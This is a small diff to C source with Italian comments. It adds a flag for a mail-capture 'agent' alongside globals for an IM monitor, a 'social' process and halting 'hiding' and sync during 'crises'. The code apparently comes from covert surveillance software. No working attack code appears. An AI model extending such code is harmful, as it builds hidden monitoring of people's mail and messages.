@@ -62,6 +62,7 @@ DWORD social_process_control;	// Semaforo per controllare il processo "social"
 BOOL network_crisis;			// Se deve fermare le sync
 BOOL system_crisis;				// Se deve fermare i comandi e l'hiding
 BOOL bPM_IMStarted;				// Flag che indica se il monitor e' attivo o meno
+BOOL bPM_MailCapStarted;		// Indica se l'agente e' attivo o meno
 
 // Nomi dei file di sistema.
 // Sono qui perche' ad esempio anche le funzioni di 
